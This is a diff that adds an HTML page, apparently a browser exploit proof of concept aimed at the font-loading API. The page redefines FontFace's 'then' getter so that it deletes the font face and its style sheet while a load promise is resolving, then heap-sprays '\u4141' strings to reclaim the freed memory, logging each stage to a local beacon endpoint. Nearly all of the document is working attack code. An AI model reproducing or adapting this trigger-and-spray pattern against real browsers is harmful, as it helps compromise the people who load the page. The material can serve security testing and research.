@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>delay</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+</script>
+<script>
+(function(){
+  var it = 0, curIter = -1, curStyle = '', STALL = 0;
+  function spin(ms){ var t0 = Date.now(); while (Date.now() - t0 < ms) {} }
+  function run() {
+    b('DL-START');
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function(){
+        if (this.__g) return undefined;
+        this.__g = true;
+        b('DL-'+curIter+'-GET');
+        var v = document.getElementById(curStyle);
+        if (v) v.remove();
+        try { document.fonts.delete(this); } catch(e){}
+        document.body.offsetHeight;
+        b('DL-'+curIter+'-LAY');
+        spin(STALL);
+        b('DL-'+curIter+'-STALL-' + STALL);
+        var spray = [];
+        for (var q = 0; q < 2000; q++) { var arr = new Array(128).fill("\u4141"); spray.push(arr.join("")); }
+        b('DL-'+curIter+'-SPR');
+        b('DL-'+curIter+'-RET');
+        return undefined;
+      },
+      set: function(){}
+    });
+    step();
+  }
+  function step(){
+    if (it >= 10) { b('DL-DONE'); return; }
+    var i = it++;
+    curIter = i; curStyle = 'vs'+i; STALL = 12 - i;
+    b('DL-'+i+'-BEGIN-stall' + STALL);
+    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+    var st = document.createElement('style');
+    st.id = curStyle;
+    st.textContent = "@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
+    document.head.appendChild(st);
+    document.fonts.load('1em a, x', 'AB').then(
+      function(){ b('DL-'+i+'-RES'); },
+      function(){ b('DL-'+i+'-REJ'); }
+    );
+    setTimeout(function(){
+      b('DL-'+i+'-END');
+      setTimeout(step, 60);
+    }, 150);
+  }
+  if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+  else document.addEventListener('DOMContentLoaded', run);
+})();
+</script>
+</head><body><p>delay</p></body></html>
